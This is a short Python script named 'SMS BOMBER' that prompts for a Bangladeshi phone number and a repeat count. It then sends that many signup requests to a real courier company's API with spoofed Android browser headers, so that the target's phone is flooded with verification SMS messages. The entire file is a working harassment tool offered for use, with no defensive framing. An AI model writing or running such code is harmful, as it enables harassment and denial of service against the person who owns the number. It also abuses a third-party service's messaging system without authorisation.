# -*- coding : utf-8 -*-

# Name    : SMS BOMBER
# Author  : HADI ANHAF AIMAN
# Create  : 04 May 2024 10:07 PM

# Import Module
import os
import sys
import time
import json
import string
import requests
from os import system

class main:
    def logo():
        system('clear')
        print(f" • SMS BOMBER BD • ")
        print(f" • MR-CODE-143 | 1.0 ")
        print(35*"-")
    def menu():
        main.logo()
        print(" • PUT NUMBER WITHOUT : +880")
        sim_number = input(" • NUMBER    :\x1b[38;5;46m ")
        print("\x1b[m • ENTER YOUR TOTAL LIMIT ")
        limit = int(input(" • LIMITATION :\x1b[38;5;46m "))
        for tl in range(limit):
            url = 'https://api.redx.com.bd/v1/user/signup'
            data = {
               "name":sim_number,
               "phoneNumber":sim_number,
               "service":"redx",
            }
            head = {
                "Host": "api.redx.com.bd",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "Origin": "https://redx.com.bd",
                "X-Requested-With": "mark.via.gp",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://redx.com.bd/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }
            post = requests.post(url,data=data,headers=head)
            print(' • SUCCESS √ ')

if __name__ == "__main__":
    main.menu()